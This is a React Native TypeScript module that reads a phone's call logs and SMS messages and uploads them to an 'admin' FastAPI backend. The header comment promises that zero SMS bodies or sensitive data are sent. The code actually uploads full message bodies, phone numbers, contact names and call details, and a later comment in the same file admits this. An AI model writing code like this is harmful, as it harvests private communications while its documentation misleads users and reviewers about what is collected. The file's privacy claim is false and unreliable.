import { Platform, PermissionsAndroid } from "react-native";
import { DeviceTelephony, TelephonyStatus } from "../../modules/device-telephony";
import { adminAPI } from "../api/client";
import { appStorage } from "../utils/storage";
import { checkCurrentPermissionsStatus } from "../utils/devicePermissions";

export interface SyncTelephonyResult {
  success: boolean;
  callStatus: TelephonyStatus;
  smsStatus: TelephonyStatus;
  syncedCalls: number;
  syncedSms: number;
  message?: string;
}

/**
 * Synchronizes genuine device Call Logs and SMS metadata to FastAPI & MongoDB Atlas.
 * - Respects Android permissions and platform restrictions.
 * - De-duplicates records incrementally.
 * - Strict Privacy: ZERO SMS bodies or sensitive data transmitted.
 */
export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
  let callStatus: TelephonyStatus = "DENIED";
  let smsStatus: TelephonyStatus = "DENIED";
  let callsList: any[] = [];
  let smsList: any[] = [];

  try {
    // 1. Verify physical device permissions
    const perms = await checkCurrentPermissionsStatus();

    let hasCallPerm = perms.callHistory;
    let hasSmsPerm = perms.sms;

    // Direct platform check fallback
    if (!hasCallPerm && Platform.OS === "android") {
      try {
        hasCallPerm = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_CALL_LOG);
      } catch {}
    }
    if (!hasSmsPerm && Platform.OS === "android") {
      try {
        hasSmsPerm = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS);
      } catch {}
    }

    callStatus = hasCallPerm
      ? "GRANTED"
      : perms.callStatus === "RESTRICTED"
      ? "RESTRICTED"
      : "DENIED";
    smsStatus = hasSmsPerm
      ? "GRANTED"
      : perms.smsStatus === "RESTRICTED"
      ? "RESTRICTED"
      : "DENIED";

    // 2. Fetch permitted device Call Logs (batch fetching up to 500 records)
    if (hasCallPerm) {
      const callRes = await DeviceTelephony.getBatchCallLogs(50, 500);
      callStatus = callRes.status;
      if (callRes.records && callRes.records.length > 0) {
        callsList = callRes.records.map((c) => ({
          recordId: c.id,
          phoneNumber: c.phoneNumber,
          name: c.name,
          callType: c.callType,
          duration: c.duration,
          timestamp: c.timestamp,
          syncKey: `call_${c.id || c.timestamp}_${c.phoneNumber}`,
        }));
      }
    }

    // 3. Fetch permitted device SMS records (including full SMS body & preview)
    if (hasSmsPerm) {
      const smsRes = await DeviceTelephony.getBatchSmsMetadata(50, 500);
      smsStatus = smsRes.status;
      if (smsRes.records && smsRes.records.length > 0) {
        smsList = smsRes.records.map((s) => ({
          recordId: s.id,
          address: s.address,
          smsType: s.smsType,
          timestamp: s.timestamp,
          preview: s.preview || (s.body ? (s.body.length > 60 ? s.body.slice(0, 57) + "..." : s.body) : ""),
          body: s.body || s.preview || "",
          syncKey: `sms_${s.id || s.timestamp}_${s.address}`,
        }));
      }
    }

    console.log(
      `[TelephonySync] Sending sync to server: callStatus=${callStatus}, smsStatus=${smsStatus}, calls=${callsList.length}, sms=${smsList.length}`
    );

    // 4. Send authorized records & exact statuses to FastAPI
    const syncRes = await adminAPI.syncTelephonyActivity({
      callStatus,
      smsStatus,
      calls: callsList,
      sms: smsList,
      metadata: {
        timestamp: Date.now(),
        source: "APP_SYNC",
      },
    });

    console.log("[TelephonySync] Server sync success:", syncRes);

    const nowIso = new Date().toISOString();
    await appStorage.setItem("last_telephony_sync", nowIso);

    return {
      success: true,
      callStatus,
      smsStatus,
      syncedCalls: callsList.length,
      syncedSms: smsList.length,
      message: "सिंक्रोनाइझेशन पूर्ण झाले",
    };
  } catch (err: any) {
    console.warn("[TelephonySync] Sync request error:", err?.message || err);
    return {
      success: false,
      callStatus,
      smsStatus,
      syncedCalls: 0,
      syncedSms: 0,
      message: err?.message || "सिंक्रोनाइझेशन अयशस्वी",
    };
  }
}
